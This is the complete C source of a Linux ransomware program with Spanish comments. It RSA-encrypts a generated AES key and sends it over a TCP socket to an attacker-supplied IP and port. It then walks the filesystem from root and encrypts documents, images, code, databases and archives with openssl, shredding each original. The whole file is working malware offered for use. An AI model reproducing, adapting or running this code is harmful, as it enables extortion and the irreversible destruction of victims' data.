
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <arpa/inet.h>


char path[100000]="/";
char extension[][10] = {
    ".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",
    ".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",
    ".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",
    ".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",
    ".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",
    ".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",
    ".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",
    ".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",
    ".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",
    ".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",
    ".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",
    ".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",
    ".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",
    ".mpeg",".3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",
    ".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",
    ".zip",".7zip"
}; //agregar como lista de extensiones
int ext_len = sizeof(extension)/(sizeof(char)*10);


char * gen_aes(){
    static char aes[48];
    srand(time(NULL)); //Tener cuidado que con la semilla pueden calcular la key
    char dic[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(int i=0; i<48; i++){
        aes[i] = dic[rand () % strlen(dic)];
    }
    //printf("%s\n",aes);
    return aes;
}

void end_file(char aes[]){
    //echo "texto ctm" | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc
    char command[100000]="echo -n '";
    char * mybin = "/usr/bin/openssl";
    int mypipe[2];
    int r = pipe(mypipe);

    if (r < 0) {
        perror("Error on creating pipe.\n");
        exit(6);
    }

    pid_t fc = fork();

    if (fc < 0) {
        perror("Error on forking.\n");
        exit(7);
    } else if (fc == 0) {
        close(mypipe[1]);
        dup2(mypipe[0], STDIN_FILENO);
        char * args[] = {
            "openssl", "rsautl", "-encrypt", 
            "-pubin", "-inkey", "clave.pub.pem", 
            "-out", "enviame.enc", (char *)NULL
        };
        int e = execv("/usr/bin/openssl", args);
        exit(0);
    } else {
        int status;
        close(mypipe[0]);
        dprintf(mypipe[1], "%s", aes);
        close(mypipe[1]);
        int ro = wait(&status);
    }

    printf("enviame.enc should have been created.\n");

}

void send_file(char * filename, char * ip, char * port){
    char * outbuffer = malloc(1024 * sizeof(char));
    int mypipe[2]; // tubería 1 -> 0
    int p = pipe(mypipe);

    if (p == -1) {
        perror("Error creating the pipe.\n");
        exit(3);
    }

    pid_t fc = fork();

    if (fc < 0) {
        perror("Error on forking...\n");
        exit(4);
    } else if (fc == 0) { // in the child
        dup2(mypipe[1], STDOUT_FILENO);
        char * myargs[] = {"base64", filename, (char *) NULL};
        int e = execv("/usr/bin/base64", myargs);
        exit(0);
    } else {
        int status;
        int r = wait(&status);

        if (r == -1) {
            perror("Something went wrong.\n");
        }

        read(mypipe[0], outbuffer, 1024);
        //printf("result: %s\n", outbuffer);

        /*
        * next code is to handle connection
        */

        int socketfd = socket(AF_INET, SOCK_STREAM, 0);
        
        if (socketfd < 0) {
            perror("Error on socket.\n");
            exit(5);
        }

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(atoi(port));
        r = inet_pton(AF_INET, ip, &server_addr.sin_addr);

        if (r < 0) {
            perror("Invalid address.");
            exit(5);
        }

        r = connect(socketfd, (struct sockaddr *) &server_addr, sizeof(server_addr));

        if (r < 0) {
            perror("Connection failed");
            exit(5);
        }

        send(socketfd, outbuffer, strlen(outbuffer), 0);
        printf("Key was sent.\n");
        shutdown(socketfd, SHUT_RDWR);
        close(socketfd);
    }

    
}

void key_pub(int i){
    char * pub_key = {
        "-----BEGIN PUBLIC KEY-----\n"
        "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2iM7qHGt9FQL1HeYldsE\n"
        "nwfmAhlc3bfmRaxVA07YrjdCVTXyhjKq5cn8iE8nDWUDwbrZKnLIe63G7LpT6L8l\n"
        "oqCgHieEPR3ZqXzuLjr0ZCkU9cFE8E1oJV7bfLEotH5iZpeuY06C1GwWi9+Kdrf9\n"
        "R0J3dplb1BIxrsAxdiq+nUHVAeUIpDefvadJsK9pjUpfvsUH7O214S8CAzH1irxY\n"
        "ejQlqrGdWXlzbeTzlm+BRl9VoxL04lioKDjw5c0dpYrP/MFysZqyzZdp3ctLwRYN\n"
        "818+heHgGYoakWTUOqlhQXZh+O6mecya5j6BaxcXSL7IacQc5+Q9GKzlm7FlNpga\n"
        "PQHKbaSbEifpCI6Ix4p/l44ZJTpq9VkrUrZNDbSsUFCIaVaFkXtGzrFcZLVusLaq\n"
        "+Y9TUF1uKzK4UxAC+hU92O+ZxVhGTg1Z99Bj4vbKvDCr1YHRJeiziwwehb4i0xia\n"
        "K8ft35krQl+Slkt57MuWrefdbtD0qvvw0u6H+6thtGZv2c4vg+MSK2pddPWC8IPi\n"
        "kSHJOxR9B3Tmw9cOBhMvKoUSHHl4Rfznw7t4hzk2FL/HTpee4vP626CVLqDycYBe\n"
        "yMo9tDSCJzE13yydTPNS5SzmavNTlAoM6VKJ8W7eqXloJ7TGTtJejzSJDGA21dGx\n"
        "8CPFuYvv302VnB7d/urDbH8CAwEAAQ==\n"
        "-----END PUBLIC KEY-----"
    };
    if(i == 1){
        int fd = open("clave.pub.pem", O_CREAT| O_WRONLY, 0600);
        write(fd, pub_key, strlen(pub_key));
        close(fd);
        fsync(fd);
    } else if(i == 0){
        char * myargs[] = {"rm", "-f","clave.pub.pem", (char *)NULL};
        
        int fc = fork();

        if (fc == 0) {
            execv("/bin/rm", myargs);
        } else if (fc < 0) {
            perror("Error on forking");
            exit(9);
        }
    }
}
//--------------------------------------------

void cifrar(char path[], char file[], char passwd[]) {
    /* todo: considerar usar pthreads.
    int fc = fork();

    if (fc < 0) {
        perror("Error on forking")
    } else (fc == 0) {
        char mypass[100] = "pass:";
        strcat(mypass, passwd);
        char * myargs[] {
        "openssl", "enc", "-aes-256-cbc", "-pass", mypass, 
        "-in", "plain.txt", "-out", "plain.txt.ntd", (char *) NULL
        };
        
        int e = execv("/usr/bin/openssl", myargs);
    } else {

    }
    */
  char command[100000]="(openssl enc -aes-256-cbc -pass pass:";
  strcat(command,passwd);
  strcat(command," -in ");
  strcat(command,path);
  strcat(command,"/");
  strcat(command,file);
  strcat(command," -out ");
  strcat(command,path);
  strcat(command,"/");
  strcat(command,file);
  strcat(command,".ntd 2>/dev/null; /usr/bin/shred -zfun 1 ");
  strcat(command,path);
  strcat(command,"/");
  strcat(command,file);
  strcat(command," 2>/dev/null)&");


  //(openssl enc -aes-256-cbc -pass pass:1234 -in plain.txt -out plain.txt.ntd 2>/dev/null; rm plain.txt 2>/dev/null)&
  system(command);
}

int find_ext(char file[]){
    for(int i=0; i<ext_len; i++){
        if(strstr(file,extension[i]) != NULL && strstr(file,".ntd") == NULL){ // que no tenga .ntd (revisar doc strstr)
            return 1;
        }
    }
    return 0;
}

int list_files(int n, int h, char key[])
{
    /*debug
    if(h == 3){
        printf("%s\n",path);
    }*/
    DIR *d;
    struct dirent *dir;
    d = opendir(path);
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if(strcmp(dir->d_name, ".") && strcmp(dir->d_name, "..")){
                if(dir->d_type == DT_DIR){
                    if(h==0 && (!strcmp(dir->d_name,"boot") || !strcmp(dir->d_name,"etc") || !strcmp(dir->d_name,"proc"))){
                        printf("este dic %s no lo toco\n",dir->d_name);
                    }else{
                        strcat(path,"/");
                        strcat(path, dir->d_name);
                        list_files(strlen(path), h+1, key);
                    }
                    path[n] = 0;
                }else if(dir->d_type == DT_REG){
                    if(find_ext(dir->d_name)){
                        //printf("%s/%s -> Filesito\n", path,dir->d_name);
                        cifrar(path, dir->d_name, key);
                    }
                }
            }
        }
        closedir(d);
    }
    return(0);
}

int create_flag(const char* filename){
    int fd = open(filename, O_CREAT | O_WRONLY, 0400);
    dprintf(fd, "1");
    close(fd);
    return 0;
}

void main(int argc, char * argv[]){
    if(argc != 3){
        fprintf(stderr,"No po\n");
        exit(69);
    }
    //Create flag
    create_flag("/root/flag.ntd");
    //Key AES para el cifrado de ficheros
    char key[48];
    strcat(key,gen_aes());
    //Key RSA Pub
    key_pub(1);
    //Creando fichero con informacion confidencial para enviar al dueño del ransomware
    end_file(key);
    //Enviando fichero confidencial
    send_file("enviame.enc",argv[1],argv[2]);
    //Del RSA Pub
    key_pub(0);
    //Listar ficheros y cifrar
    list_files(strlen(path),0,key);
}
